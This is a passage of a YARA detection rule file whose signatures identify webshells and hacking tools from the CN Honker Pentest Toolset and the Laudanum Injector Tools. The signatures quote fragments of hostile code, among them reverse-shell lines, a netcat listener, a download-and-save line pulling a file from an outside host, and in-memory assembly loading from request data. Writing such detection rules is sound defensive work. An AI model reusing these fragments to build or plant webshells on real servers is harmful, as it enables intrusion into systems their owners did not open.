      $s3 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\"" ascii
   condition: 
      filesize < 30KB and 2 of them
}

rule CN_Honker_Webshell_cfm_list_RID31AD : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file list.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:32:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<TD><a href=\"javascript:ShowFile('#mydirectory.name#')\">#mydirectory.name#</a>" ascii
      $s2 = "<TD>#mydirectory.size#</TD>" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule CN_Honker_Webshell_PHP_php2_RID311D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
      $s2 = "<?php // Black" fullword ascii
   condition: 
      filesize < 12KB and all of them
}

rule CN_Honker_Webshell_Tuoku_script_oracle_RID363D : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file oracle.jsp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:47:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii
      $s2 = "String user=\"oracle_admin\";" fullword ascii
      $s3 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii
   condition: 
      filesize < 7KB and all of them
}

rule CN_Honker_Webshell_ASPX_aspx4_RID31E7 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "File.Delete(cdir.FullName + \"\\\\test\");" fullword ascii
      $s5 = "start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60" ascii
      $s6 = "<div>Code By <a href =\"http://www.hkmjj.com\">Www.hkmjj.Com</a></div>" fullword ascii
   condition: 
      filesize < 11KB and all of them
}

rule CN_Honker_Webshell_su7_x_9_x_RID31C1 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file su7.x-9.x.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "returns=httpopen(\"LoginID=\"&user&\"&FullName=&Password=\"&pass&\"&ComboPasswor" ascii
      $s1 = "returns=httpopen(\"\",\"POST\",\"http://127.0.0.1:\"&port&\"/Admin/XML/User.xml?" ascii
   condition: 
      filesize < 59KB and all of them
}

rule CN_Honker_Webshell_Serv_U_2_admin_by_lake2_RID3711 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U 2 admin by lake2.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:22:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/lake2\", True" fullword ascii
      $s2 = "response.write \"FTP user lake  pass admin123 :)<br><BR>\"" fullword ascii
      $s8 = "<p>Serv-U Local Get SYSTEM Shell with ASP" fullword ascii
      $s9 = "\"-HomeDir=c:\\\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vb" ascii
   condition: 
      filesize < 17KB and 2 of them
}

rule CN_Honker_Webshell_PHP_php3_RID311E : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii
      $s2 = "cf('/tmp/.bc',$back_connect);" fullword ascii
   condition: 
      filesize < 8KB and all of them
}

rule CN_Honker_Webshell_Serv_U_by_Goldsun_RID3525 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True," ascii
      $s2 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
      $s3 = "127.0.0.1:<%=port%>," fullword ascii
      $s4 = "GName=\"http://\" & request.servervariables(\"server_name\")&\":\"&request.serve" ascii
   condition: 
      filesize < 30KB and 2 of them
}

rule CN_Honker_Webshell_PHP_php10_RID314C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php10.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:16:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "dumpTable($N,$M,$Hc=false){if($_POST[\"format\"]!=\"sql\"){echo\"\\xef\\xbb\\xbf" ascii
      $s2 = "';if(DB==\"\"||!$od){echo\"<a href='\".h(ME).\"sql='\".bold(isset($_GET[\"sql\"]" ascii
   condition: 
      filesize < 600KB and all of them
}

rule CN_Honker_Webshell_portRecall_jsp2_RID3452 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:25:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "final String remoteIP =request.getParameter(\"remoteIP\");" fullword ascii
      $s4 = "final String localIP = request.getParameter(\"localIP\");" fullword ascii
      $s20 = "final String localPort = \"3390\";//request.getParameter(\"localPort\");" fullword ascii
   condition: 
      filesize < 23KB and all of them
}

rule CN_Honker_Webshell_ASPX_aspx2_RID31E5 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if (password.Equals(this.txtPass.Text))" fullword ascii
      $s1 = "<head runat=\"server\">" fullword ascii
      $s2 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii
      $s3 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 9KB and all of them
}

rule CN_Honker_Webshell_Tuoku_script_mysql_RID35FD : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mysql.aspx"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "txtpassword.Attributes.Add(\"onkeydown\", \"SubmitKeyClick('btnLogin');\");" fullword ascii
      $s2 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Databas" ascii
   condition: 
      filesize < 202KB and all of them
}

rule CN_Honker_Webshell_portRecall_jsp_RID3420 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:17:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2" ascii
   condition: 
      filesize < 1KB and all of them
}

rule CN_Honker_Webshell_ASPX_aspx3_RID31E6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m" ascii
      $s12 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS:" ascii
   condition: 
      filesize < 100KB and all of them
}

rule CN_Honker_Webshell_ASPX_shell_shell_RID3486 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file shell.aspx"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:34:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook" ascii
      $s1 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule CN_Honker_Webshell__php1_php7_php9_RID33F2 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:09:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
      hash2 = "cd3962b1dba9f1b389212e38857568b69ca76725"
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii
      $s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
      $s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
   condition: 
      filesize < 300KB and all of them
}

rule CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL__RID36A6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:04:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash2 = "7097c21f92306983add3b5b29a517204cd6cd819"
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii
      $s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
      $s2 = "Set Conn = Nothing " fullword ascii
   condition: 
      filesize < 341KB and all of them
}

rule CN_Honker_Webshell_PHP_php4_RID311F : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "nc -l -vv -p port(" ascii
   condition: 
      uint16 ( 0 ) == 0x4850 and filesize < 1KB and all of them
}

rule CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6 : CHINA DEMO EXPLOIT LINUX T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:47:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, EXPLOIT, LINUX, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
   condition: 
      filesize < 56KB and all of them
}

rule CN_Honker_Webshell_ASP_asp2_RID3115 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
      $s2 = "webshell</font> <font color=#00FF00>" fullword ascii
      $s3 = "Userpwd = \"admin\"   'User Password" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH_RID3477 : CHINA DEMO T1021_004 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1021_004, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii
      $s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
      $s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii
      $s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii
      $s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii
   condition: 
      filesize < 20KB and 3 of them
}

rule CN_Honker_Webshell_ASP_shell_RID31B7 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file shell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:34:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii
      $s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii
      $s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule CN_Honker_Webshell_PHP_php7_RID3122 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php7.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }" ascii
      $s1 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss" ascii
   condition: 
      filesize < 300KB and all of them
}

rule CN_Honker_Webshell_jspshell_RID31C1 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jspshell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce" ascii
      $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
   condition: 
      filesize < 30KB and all of them
}

rule CN_Honker_Webshell_WebShell_RID3172 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file WebShell.cgi"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:22:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$login = crypt($WebShell::Configuration::password, $salt);" fullword ascii
      $s2 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword ascii
      $s3 = "warn \"command: '$command'\\n\";" fullword ascii
   condition: 
      filesize < 30KB and 2 of them
}

rule CN_Honker_Webshell_Tuoku_script_mssql_2_RID3688 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mssql.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:59:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "sqlpass=request(\"sqlpass\")" fullword ascii
      $s2 = "set file=fso.createtextfile(server.mappath(request(\"filename\")),8,true)" fullword ascii
      $s3 = "<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;" fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule CN_Honker_Webshell_ASP_asp1_RID3114 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp1.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "SItEuRl=" ascii
      $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
      $s3 = "Server.ScriptTimeout=" ascii
   condition: 
      filesize < 200KB and all of them
}

rule CN_Honker_ASP_wshell_RID2E99 : CHINA DEMO FILE HKTL {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file wshell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:21:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
      $s1 = "UserPass=" 
      $s2 = "VerName=" 
      $s3 = "StateName=" 
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 200KB and all of them
}

rule CN_Honker_Alien_iispwd_RID2F9F : CHINA DEMO HKTL SCRIPT {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file iispwd.vbs"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, HKTL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "set IIs=objservice.GetObject(\"IIsWebServer\",childObjectName)" fullword ascii
      $s1 = "wscript.echo \"from : http://www.xxx.com/\" &vbTab&vbCrLf" fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule CN_Honker_IIS6_iis6_RID2DBC : CHINA DEMO EXE FILE HKTL {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file iis6.com"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:44:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, EXE, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "GetMod;ul" fullword ascii
      $s1 = "excjpb" fullword ascii
      $s2 = "LEAUT1" fullword ascii
      $s3 = "EnumProcessModules" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them
}

rule CN_Honker_Tuoku_script_oracle_2_RID3339 : CHINA DEMO HKTL SCRIPT {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file oracle.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:38:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, HKTL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "webshell" fullword ascii
      $s1 = "Silic Group Hacker Army " fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule Webshell_XML_WEB_INF_web_RID2FAD : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file web.xml"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 12:07:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<servlet-name>Command</servlet-name>" fullword ascii
      $s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule Webshell_asp_file_RID2DE9 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file file.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
      $s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
      $s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii
      $s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii
      $s5 = "set folder = fso.GetFolder(path)" fullword ascii
      $s6 = "Set file = fso.GetFile(filepath)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 30KB and 5 of them
}

rule Webshell_settings_PHP_RID2F5E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file settings.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:54:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii
      $s2 = "<li>Reverse Shell - " fullword ascii
      $s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii
   condition: 
      filesize < 13KB and all of them
}

rule Webshell_aspx_shell_RID2ED9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.aspx"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "remoteIp = HttpContext.Current.Request.Headers[\"X-Forwarded-For\"].Split(new" ascii
      $s2 = "remoteIp = Request.UserHostAddress;" fullword ascii
      $s3 = "<form method=\"post\" name=\"shell\">" fullword ascii
      $s4 = "<body onload=\"document.shell.c.focus()\">" fullword ascii
   condition: 
      filesize < 20KB and all of them
}

rule Webshell_php_shell_RID2E65 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:12:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "command_hist[current_line] = document.shell.command.value;" fullword ascii
      $s2 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii
      $s3 = "array_unshift($_SESSION['history'], $command);" fullword ascii
      $s4 = "if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {" fullword ascii
   condition: 
      filesize < 40KB and all of them
}

rule Webshell_php_reverse_shell_RID31C0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file php-reverse-shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 13:35:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
      $s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii
   condition: 
      filesize < 15KB and all of them
}

rule Webshell_php_dns_RID2D92 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file dns.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:37:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
